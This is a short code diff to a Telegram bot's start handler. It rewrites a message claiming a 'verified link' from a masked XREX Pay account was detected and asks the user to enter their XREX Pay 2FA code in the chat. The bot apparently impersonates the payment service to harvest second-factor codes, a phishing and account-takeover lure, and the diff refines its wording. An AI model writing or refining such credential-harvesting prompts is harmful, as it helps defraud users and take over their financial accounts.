@@ -1154,8 +1154,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 sent = await update.message.reply_text(
-                    "️🔍 Valid unique verification link detected from XREX Pay account \"@AG***CH\"\n\n"
-                    "️👉 Please enter your XREX Pay 2FA here, to proceed with linking your Telegram account to XREX Pay.",
+                    "️🔍 Verified link from XREX Pay account \"@AG*CH\" detected.\n\n"
+                    "️👉 Please enter your XREX Pay 2FA code below to start linking.",
                     reply_markup=reply_markup
                 )
                 # No pinning per updated spec
